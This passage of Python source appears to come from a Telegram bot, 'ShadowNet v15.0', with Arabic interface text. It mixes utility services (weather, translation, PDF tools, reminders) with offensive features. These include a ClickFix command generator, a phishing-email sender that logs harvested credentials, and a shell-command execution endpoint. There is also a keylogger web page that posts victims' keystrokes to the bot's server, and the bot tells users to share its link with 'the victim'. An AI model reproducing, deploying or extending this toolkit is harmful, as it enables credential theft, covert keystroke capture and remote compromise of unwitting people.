        if not is_admin(chat_id):
            return jsonify({"error": "غير مصرح"}), 403
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
        output = output.decode('utf-8', errors='ignore')
        safe_db_execute("INSERT INTO hack_commands (chat_id, command, output, created_at) VALUES (?, ?, ?, ?)",
                        (str(chat_id), command, output, datetime.now().isoformat()))
        notify_admin(f"🖥️ RCE من {chat_id}: {command} -> {output[:200]}")
        return jsonify({"output": output})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/s/<short_code>')
def redirect_short(short_code):
    original = expand_url(f"{SERVER_URL}/s/{short_code}")
    if original:
        return redirect(original)
    return "الرابط غير صحيح", 404

# ===================== معالجات النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text(message):
    try:
        chat_id = message.chat.id
        text = message.text.strip()
        state = user_states.get(chat_id)

        update_last_seen(chat_id)
        log_activity(chat_id, f"text: {text[:50]}")

        if is_banned(chat_id) and not is_admin(chat_id):
            safe_send(chat_id, "أنت محظور.")
            return
        if BOT_LOCKED and not is_admin(chat_id):
            safe_send(chat_id, "البوت مقفل.")
            return

        # ===== ClickFix =====
        if state == "waiting_clickfix_target":
            target_name = text or "مستخدم"
            fake_command = generate_clickfix_command(target_name)
            safe_send(chat_id, f"📋 **أمر ClickFix المخصص لـ {target_name}:**\n\n```\n{fake_command}\n```\n\n📌 **تعليمات:**\n1. انسخ الأمر بالكامل.\n2. افتح **تشغيل (Win+R)** أو **الطرفية (CMD)**.\n3. الصق الأمر واضغط Enter.\n4. سيظهر لك أن المشكلة قد حُلَّت (وهو في الحقيقة أمر وهمي).\n\n⚠️ هذا الأمر آمن تمامًا ولا ينفذ أي تغيير حقيقي (محاكاة تعليمية).", parse_mode="Markdown")
            user_states[chat_id] = None
            return

        # ===== بريد تصيد =====
        if state == "waiting_phishing_target":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            target_email = text
            safe_db_execute("INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                            (target_email, platform, "pending", "pending", request.remote_addr if 'request' in locals() else 'unknown', datetime.now().isoformat()))
            result = send_phishing_email(target_email, platform)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        # ===== RCE (تنفيذ أوامر) =====
        if state == "waiting_rce":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            try:
                output = subprocess.check_output(text, shell=True, stderr=subprocess.STDOUT, timeout=30)
                output = output.decode('utf-8', errors='ignore')
            except Exception as e:
                output = str(e)
            safe_db_execute("INSERT INTO hack_commands (chat_id, command, output, created_at) VALUES (?, ?, ?, ?)",
                            (str(chat_id), text, output, datetime.now().isoformat()))
            safe_send(chat_id, f"🖥️ نتيجة الأمر:\n{output[:3000]}")
            user_states[chat_id] = None
            return

        # ===== Keylogger =====
        if state == "waiting_keylogger":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            keylogger_html = f'''
            <!DOCTYPE html>
            <html>
            <body>
            <script>
            let keystrokes = '';
            document.addEventListener('keydown', function(e) {{
                keystrokes += e.key;
                if (keystrokes.length > 50) {{
                    fetch('{SERVER_URL}/api/collect_keylog', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{chat_id: '{chat_id}', keystrokes: keystrokes}})
                    }});
                    keystrokes = '';
                }}
            }});
            </script>
            <h1>Loading...</h1>
            </body>
            </html>
            '''
            os.makedirs('temp', exist_ok=True)
            filename = f"temp/keylogger_{chat_id}_{int(time.time())}.html"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(keylogger_html)
            link = f"{SERVER_URL}/temp/keylogger_{chat_id}_{int(time.time())}.html"
            safe_send(chat_id, f"🔑 رابط Keylogger:\n{link}\n\nشارك هذا الرابط مع الضحية.")
            user_states[chat_id] = None
            return

        # ===== خدمات عامة =====
        if state == "weather":
            safe_send(chat_id, get_weather_detailed(text))
            user_states[chat_id] = None
            return

        if state == "wikipedia":
            safe_send(chat_id, f"📚 نتيجة البحث:\n{advanced_wikipedia_search(text)}")
            user_states[chat_id] = None
            return

        if state == "translate":
            user_states[chat_id] = "waiting_translate_lang"
            user_states[f"{chat_id}_translate_text"] = text
            safe_send(chat_id, "🌐 اختر اللغة المستهدفة:", reply_markup=build_translate_menu())
            return

        if state == "reminder":
            parts = text.split('|')
            if len(parts) >= 2:
                msg_text = parts[0].strip()
                time_str = parts[1].strip()
                try:
                    hour, minute = map(int, time_str.split(':'))
                    now = datetime.now()
                    target_time = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
                    if target_time <= now:
                        target_time += timedelta(days=1)
                    safe_db_execute("INSERT INTO reminders (chat_id, message, remind_time, created_at) VALUES (?, ?, ?, ?)",
                                    (chat_id, msg_text, target_time.isoformat(), datetime.now().isoformat()))
                    safe_send(chat_id, f"✅ تم تعيين التذكير لـ {time_str}")
                except:
                    safe_send(chat_id, "❌ وقت غير صحيح.")
            else:
                safe_send(chat_id, "❌ صيغة غير صحيحة. استخدم: الرسالة|الساعة:الدقيقة")
            user_states[chat_id] = None
            return

        if state == "news":
            safe_send(chat_id, f"📰 الأخبار:\n{get_news_without_api(text)}")
            user_states[chat_id] = None
            return

        if state == "shorten_url":
            result = shorten_url(text)
            safe_send(chat_id, f"🔗 الرابط المختصر:\n{result if result else 'فشل القص'}")
            user_states[chat_id] = None
            return

        if state == "expand_url":
            result = expand_url(text)
            safe_send(chat_id, f"🔗 الرابط الأصلي:\n{result if result else 'فشل الفك'}")
            user_states[chat_id] = None
            return

        if state == "track_phone":
            safe_send(chat_id, track_phone_number(text))
            user_states[chat_id] = None
            return

        if state == "check_link_btn":
            if not re.match(r'https?://', text):
                safe_send(chat_id, "❌ الرابط غير صحيح.")
                return
            result = check_link_no_api(text)
            safe_send(chat_id, f"🔍 نتيجة فحص الرابط:\n{json.dumps(result, indent=2, ensure_ascii=False)}")
            user_states[chat_id] = None
            return

        if state == "generate_image_btn":
            safe_send(chat_id, "⏳ جاري توليد الصورة...")
            try:
                image_bytes = generate_image(text)
                if image_bytes:
                    bot.send_photo(chat_id, image_bytes, caption=f"🎨 الصورة المولدة لوصف: {text}")
                else:
                    safe_send(chat_id, "❌ فشل توليد الصورة.")
            except Exception as e:
                safe_send(chat_id, f"❌ حدث خطأ: {str(e)[:100]}")
            user_states[chat_id] = None
            return

        if state == "voice_gtts_menu":
            voice_name = user_voice_selection.get(chat_id, "مصري")
            lang = VOICES.get(voice_name, "ar")
            safe_send(chat_id, "⏳ جاري تحويل النص إلى صوت...")
            try:
                voice_bytes = generate_voice_gtts(text, lang)
                if voice_bytes:
                    bot.send_voice(chat_id, voice_bytes, caption=f"🎤 تم التوليد باستخدام {voice_name}")
                else:
                    safe_send(chat_id, "❌ فشل توليد الصوت.")
            except Exception as e:
                safe_send(chat_id, f"❌ حدث خطأ: {str(e)[:100]}")
            user_states[chat_id] = None
            return

        if state == "pdf_menu":
            safe_send(chat_id, "📄 اختر خدمة PDF:", reply_markup=build_pdf_menu())
            user_states[chat_id] = None
            return

        if state == "pdf_summary":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                safe_send(chat_id, f"📄 الملخص:\n{pdf_text[:1000]}...")
            else:
                safe_send(chat_id, "لم يتم تحميل أي ملف PDF.")
            user_states[chat_id] = None
            return

        if state == "pdf_extract":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                safe_send(chat_id, f"📄 النص المستخرج:\n{pdf_text[:3000]}...")
            else:
                safe_send(chat_id, "لم يتم تحميل أي ملف PDF.")
            user_states[chat_id] = None
            return

        if state == "pdf_smart":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                user_states[chat_id] = "waiting_pdf_question"
                safe_send(chat_id, "🤖 اطرح سؤالك حول محتوى الـ PDF:")
            else:
                safe_send(chat_id, "لم يتم تحميل أي ملف PDF.")
            user_states[chat_id] = None
            return

        if state == "waiting_pdf_question":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                safe_send(chat_id, f"📚 الإجابة:\n{smart_pdf_search(pdf_text, text)}")
            else:
                safe_send(chat_id, "❌ لم يتم تحميل أي ملف PDF.")
            user_states[chat_id] = None
            return

        if state == "analyze_apk":
            safe_send(chat_id, "📦 أرسل ملف APK للتحليل.")
            user_states[chat_id] = None
            return

        if state == "create_email_btn":
            name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            domain = random.choice(["1secmail.com", "1secmail.org", "1secmail.net"])
            email = f"{name}@{domain}"
            user_emails[chat_id] = [email, name, domain]
            safe_send(chat_id, f"📧 تم انشاء بريدك المؤقت\n`{email}`\nالصلاحية: 10 دقائق")
            user_states[chat_id] = None
            return

        if state == "my_points":
            points = get_user_points(chat_id)
            safe_send(chat_id, f"💎 رصيد نقاطك: {points}")
            user_states[chat_id] = None
            return

        if state == "my_referral":
            code = safe_db_query("SELECT referral_code FROM users WHERE chat_id = ?", (chat_id,))
            if code and code[0]:
                safe_send(chat_id, f"🔗 رابط دعوتك:\nhttps://t.me/{bot.get_me().username}?start=ref_{code[0]}")
            else:
                new_code = secrets.token_urlsafe(8)
                safe_db_execute("UPDATE users SET referral_code = ? WHERE chat_id = ?", (new_code, chat_id))
                safe_send(chat_id, f"🔗 رابط دعوتك:\nhttps://t.me/{bot.get_me().username}?start=ref_{new_code}")
            user_states[chat_id] = None
            return

        if state == "points_history":
            rows = safe_db_query("SELECT amount, reason, created_at FROM points_log WHERE user_id = ? ORDER BY created_at DESC LIMIT 10", (chat_id,), fetch_one=False)
            if rows:
                msg = "📜 سجل النقاط:\n"
                for r in rows:
                    msg += f"{r[0]} نقطة - {r[1]} - {r[2][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد سجلات.")
            user_states[chat_id] = None
            return

        if state == "admin_broadcast":
            if not is_admin(chat_id): return
            users = safe_db_query("SELECT chat_id FROM users", fetch_one=False)
            sent = 0
            for user in users:
                try:
                    bot.send_message(user[0], f"📢 رسالة من الإدارة:\n{text}")
                    sent += 1
                    time.sleep(0.05)
                except:
                    pass
            safe_send(chat_id, f"✅ تم الإرسال لـ {sent} مستخدم.")
            user_states[chat_id] = None
            return

        if state == "send_to_user":
            if not is_admin(chat_id): return
            target_user = user_states.get(f"{chat_id}_send_target")
            if target_user:
                safe_send(target_user, text)
                safe_send(chat_id, f"✅ تم الإرسال إلى {get_user_name(target_user)}")
            else:
                safe_send(chat_id, "لم يتم تحديد مستهدف.")
            user_states[chat_id] = None
            return

        if state == "admin_points_menu":
            if not is_admin(chat_id): return
            target_user = user_states.get(f"{chat_id}_points_target")
            if target_user:
                try:
                    amount = int(text)
                    add_points(target_user, amount, "إدارة النقاط من قبل المطور")
                    safe_send(chat_id, f"✅ تم إضافة {amount} نقطة للمستخدم {get_user_name(target_user)}")
                except:
                    safe_send(chat_id, "❌ أدخل عدداً صحيحاً.")
            else:
                safe_send(chat_id, "لم يتم تحديد مستهدف.")
            user_states[chat_id] = None
            return

        # ===== اقتباسات، أذكار، أدعية =====
        if state == "quote_cat_":
            category = text
            quotes = QUOTES_DB.get(category, ["لا توجد اقتباسات"])
            safe_send(chat_id, f"💬 {category}:\n\n{random.choice(quotes)}")
            user_states[chat_id] = None
            return

        if state == "doaa_menu":
            safe_send(chat_id, "اختر الدعاء:", reply_markup=build_doaa_menu())
            user_states[chat_id] = None
            return

        if state == "muslim_menu":
            safe_send(chat_id, "اختر الموضوع:", reply_markup=build_muslim_menu())
            user_states[chat_id] = None
            return

        if state == "adkar_sabah":
            safe_send(chat_id, f"📿 أذكار الصباح:\n\n{ADKAR_SABAH[0]}")
            user_states[chat_id] = None
            return

        if state == "adkar_massaa":
            safe_send(chat_id, f"🌙 أذكار المساء:\n\n{ADKAR_MASSAA[0]}")
            user_states[chat_id] = None
            return

        # إذا لم تكن هناك حالة، إظهار القائمة الرئيسية
        if state is None:
            safe_send(chat_id, "القائمة الرئيسية", reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"handle_text error: {e}")
        safe_send(chat_id, "حدث خطأ.")
        notify_admin(f"خطأ في النص: {e}")

# ===================== معالجات الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    try:
        chat_id = message.chat.id
        file = message.document
        file_name = file.file_name or "بدون اسم"

        if file_name.lower().endswith('.pdf'):
            safe_send(chat_id, "📄 جاري قراءة الملف...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            text = extract_pdf_text(downloaded)
            if text and not text.startswith("خطأ"):
                pdf_texts[chat_id] = text
                safe_send(chat_id, f"✅ تم استخراج النص (عدد الأحرف: {len(text)})")
                safe_send(chat_id, "📊 اختر الإجراء:", reply_markup=build_pdf_menu())
            else:
                safe_send(chat_id, f"❌ {text}")
            return

        if user_states.get(chat_id) == "analyze_apk":
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "❌ يرجى إرسال ملف APK.")
                return
            safe_send(chat_id, "📦 جاري تحليل APK...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            result = analyze_apk(downloaded, file_name)
            if result.get('error'):
                safe_send(chat_id, f"❌ فشل: {result['error']}")
            else:
                msg = f"📦 تحليل APK:\nالملف: {file_name}\nالأذونات الخطيرة: {result.get('dangerous_permissions', [])}\nضار: {'نعم' if result.get('malicious') else 'لا'}"
                safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        safe_send(chat_id, "📄 تم استلام الملف.")
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        safe_send(chat_id, f"❌ خطأ: {str(e)[:100]}")

# ===================== دوال Keep-Alive والتذكيرات =====================
def keep_alive():
    while True:
        time.sleep(120)
        try:
            requests.get(f"{SERVER_URL}/health", timeout=10)
        except:
            pass

def check_reminders():
    while True:
        try:
            now = datetime.now().isoformat()
            rows = safe_db_query("SELECT id, chat_id, message FROM reminders WHERE remind_time <= ? AND is_active = 1", (now,), fetch_one=False)
            for rid, chat_id, msg in rows:
                safe_send(chat_id, f"⏰ تذكير:\n{msg}")
                safe_db_execute("UPDATE reminders SET is_active = 0 WHERE id = ?", (rid,))
        except Exception as e:
            logger.error(f"check_reminders error: {e}")
        time.sleep(30)

# ===================== تشغيل البوت مع قتل النسخ القديمة =====================
def start_bot():
    # قتل أي نسخة قديمة قبل البدء
    kill_old_bot_instances()
    
    # حذف webhook للتأكد
    try:
        bot.delete_webhook()
        logger.info("✅ Webhook deleted")
        time.sleep(2)
    except Exception as e:
        logger.warning(f"⚠️ Webhook deletion failed: {e}")
    
    # بدء polling
    while True:
        try:
            logger.info("🚀 Starting bot polling...")
            bot.polling(
                none_stop=True,
                interval=0,
                timeout=60,
                long_polling_timeout=60,
                skip_pending=True
            )
        except Exception as e:
            error_msg = str(e)
            logger.error(f"❌ Bot error: {e}")
            if "409" in error_msg:
                logger.warning("⚠️ Conflict 409 detected. Killing old instances and retrying...")
                kill_old_bot_instances()
                time.sleep(5)
            else:
                time.sleep(15)

# ===================== التشغيل النهائي =====================
if __name__ == '__main__':
    print("\n" + "="*60)
    print("🤖 ShadowNet v15.0 - النسخة النهائية المعدلة")
    print("📌 جميع الأخطاء مصلحة (SMTP, time, 409 Conflict)")
    print("📌 آلية قتل النسخ القديمة مفعلة")
    print("📌 تم تحديث صفحات التصيد وفق مواصفات 2026")
    print("📌 كاميرا ومكالمة فيديو متطورة مع التقاط صور متعددة")
    print(f"📌 Health Check: {SERVER_URL}/health")
    print("="*60 + "\n")

    try:
        bot.delete_webhook()
    except:
        pass

    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=check_reminders, daemon=True).start()
    threading.Thread(target=start_bot, daemon=True).start()

    app.run(host='0.0.0.0', port=PORT, debug=False)
